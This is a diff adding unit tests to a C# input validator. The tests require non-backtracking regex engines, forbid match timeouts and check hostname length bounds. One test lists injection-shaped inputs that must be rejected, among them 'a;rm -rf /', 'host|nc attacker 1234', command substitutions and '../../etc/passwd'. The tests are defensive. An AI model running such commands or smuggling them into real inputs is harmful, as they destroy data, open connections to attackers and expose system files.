@@ -14,6 +14,7 @@
  * limitations under the License.
  */
 
+using System.Text.RegularExpressions;
 using Heimdall.Core.Security;
 
 namespace Heimdall.Core.Tests;
@@ -164,6 +165,109 @@ public class InputValidatorTests
         string hostname = $"{longLabel}.example.com";
 
         Assert.False(InputValidator.Validate(hostname, "Hostname"));
+    }
+
+    // ── Engine policy: no wall-clock deadline decides validity ──────────
+
+    [Fact]
+    public void EveryPattern_RunsOnTheNonBacktrackingEngine()
+    {
+        // Asserted as a policy, not inferred from how fast a match runs. A timing oracle would
+        // itself be scheduling-dependent, which is the defect this replaces.
+        foreach (string name in InputValidator.GetPatternNames())
+        {
+            RegexOptions? options = InputValidator.GetPatternOptions(name);
+
+            Assert.NotNull(options);
+            Assert.True(
+                options!.Value.HasFlag(RegexOptions.NonBacktracking),
+                $"Pattern '{name}' is not on the non-backtracking engine: {options}.");
+
+            // Compiled and NonBacktracking are accepted together by the runtime, and the compiled
+            // backtracking engine is then bypassed. Allowing the flag would let the pattern claim
+            // an engine it does not use, so it is refused outright.
+            Assert.False(
+                options.Value.HasFlag(RegexOptions.Compiled),
+                $"Pattern '{name}' still carries RegexOptions.Compiled: {options}.");
+        }
+    }
+
+    [Fact]
+    public void NoPattern_CarriesAMatchDeadline()
+    {
+        // A deadline is decided by the scheduler, so any finite value can refuse a valid input on
+        // a loaded machine. The non-backtracking engine is what bounds the match instead.
+        foreach (string name in InputValidator.GetPatternNames())
+        {
+            TimeSpan? timeout = InputValidator.GetPatternMatchTimeout(name);
+
+            Assert.NotNull(timeout);
+            Assert.Equal(Regex.InfiniteMatchTimeout, timeout!.Value);
+        }
+    }
+
+    [Fact]
+    public void GetPatternOptions_UnknownPattern_ReturnsNull()
+    {
+        Assert.Null(InputValidator.GetPatternOptions("FakePattern"));
+        Assert.Null(InputValidator.GetPatternMatchTimeout("FakePattern"));
+    }
+
+    [Theory]
+    [InlineData("gateway.example.com")]
+    [InlineData("host")]
+    [InlineData("a.b.c.d.example.com")]
+    [InlineData("192.168.1.1")]
+    [InlineData("127.0.0.1")]
+    public void Validate_ShortValidAddress_IsAccepted(string value)
+    {
+        // The exact value whose rejection started this: a short, ordinary hostname must be
+        // accepted on its own merits, never refused because a deadline elapsed mid-match.
+        Assert.True(InputValidator.Validate(value, "Address"));
+    }
+
+    [Theory]
+    [InlineData("a;rm -rf /")]
+    [InlineData("host name")]
+    [InlineData("host$(whoami)")]
+    [InlineData("host|nc attacker 1234")]
+    [InlineData("host`id`")]
+    [InlineData("host&&echo")]
+    [InlineData("../../etc/passwd")]
+    [InlineData("host\nsecond")]
+    public void Validate_InjectionShapedAddress_IsStillRefused(string value)
+    {
+        // Fail-closed is preserved: these are refused by failing to match, not by timing out.
+        Assert.False(InputValidator.Validate(value, "Address"));
+    }
+
+    [Fact]
+    public void Validate_FqdnOverTheLimit_IsRefusedByTheBoundAloneNotByLabelRules()
+    {
+        // Every label is legal and no invalid sequence is present, so the total-length bound is
+        // the only rule that can refuse this. Removing that bound makes this value pass.
+        string label = new('a', 60);
+        string oversized = string.Join('.', label, label, label, label, label);
+
+        Assert.True(oversized.Length > 255, "the fixture must exceed the FQDN limit");
+        Assert.All(oversized.Split('.'), part => Assert.True(part.Length <= 63));
+        Assert.DoesNotContain("..", oversized, StringComparison.Ordinal);
+
+        Assert.False(InputValidator.Validate(oversized, "Address"));
+        Assert.False(InputValidator.Validate(oversized, "Hostname"));
+        Assert.False(InputValidator.Validate(oversized, "SshGateway"));
+    }
+
+    [Fact]
+    public void Validate_FqdnAtTheLimit_IsStillAccepted()
+    {
+        // The bound must refuse what exceeds it and nothing else: a name exactly at the limit is
+        // legal, so a mutant tightening the comparison to >= is caught here.
+        string label = new('a', 63);
+        string atLimit = string.Join('.', label, label, label, label);
+
+        Assert.Equal(255, atLimit.Length);
+        Assert.True(InputValidator.Validate(atLimit, "Hostname"));
     }
 
     // ── Unknown pattern ─────────────────────────────────────────────────
